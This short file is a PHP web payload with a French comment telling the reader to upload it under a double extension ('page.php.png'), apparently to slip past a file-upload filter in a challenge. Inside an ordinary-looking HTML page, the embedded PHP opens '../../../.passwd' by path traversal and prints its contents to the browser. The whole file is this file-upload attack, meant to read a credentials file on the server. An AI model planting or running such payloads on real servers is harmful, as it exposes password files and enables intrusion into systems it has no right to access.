
// faire une double extension page.php.png
<!DOCTYPE html>
<html>
    <head>
        <title>test lecture fichier</title>
        <meta charset="utf-8">
    </head>
    
    <body>
        <h1>Coucou</h1>
        <?php       
            $ressource = fopen('../../../.passwd', 'rb');
            echo fread($ressource, filesize('../../../.passwd'));
        ?>
        <p>Coucou bis</p>
    </body>
</html>
